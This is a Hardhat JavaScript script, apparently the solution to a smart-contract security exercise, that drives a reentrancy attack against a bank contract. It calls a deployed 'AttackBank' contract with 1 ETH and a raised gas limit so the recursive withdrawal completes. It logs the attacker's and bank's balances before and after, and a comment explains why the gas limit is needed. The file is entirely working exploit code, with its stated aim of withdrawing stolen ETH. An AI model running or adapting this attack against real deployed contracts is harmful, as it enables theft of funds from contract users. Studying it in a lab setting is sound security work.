const hre = require("hardhat");
const config = require("../../config");

const etherBankAddress = config.configData.bankContractAddress;
const maliciousContractAddress = config.configData.attackContractAddress;
const contractName = "contracts/solution/AttackBank.sol:AttackBank";

async function main() {

    const signers = await hre.ethers.getSigners();
    // const provider = await hre.ethers.getDefaultProvider();
    const signer = signers[3];
    attackContract = await hre.ethers.getContractAt(contractName, maliciousContractAddress, signer);

    // Print state before attack
    console.log("My balance before the attack: ", hre.ethers.utils.formatUnits(await signer.getBalance()));
    console.log(`Bank balance before the attack: ${hre.ethers.utils.formatUnits(await hre.ethers.provider.getBalance(etherBankAddress))}`)

    // Execute the attack and withdraw stolen ETH
    console.log("Executing the attack...");
    await (await attackContract.attack({value: hre.ethers.utils.parseEther("1.0"), gasLimit: '0x'+(2000000).toString(16)})).wait();

    // Without Gas Limit it won't work because it will run out of gas in the middle of the recursion
    // await (await attackContract.steal({value: hre.ethers.utils.parseEther("1.0")})).wait();

    // Print Summary
    console.log("Attack Done.");
    console.log("My balance after the attack: ", hre.ethers.utils.formatUnits(await signer.getBalance()));
    
    
}

module.exports = main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
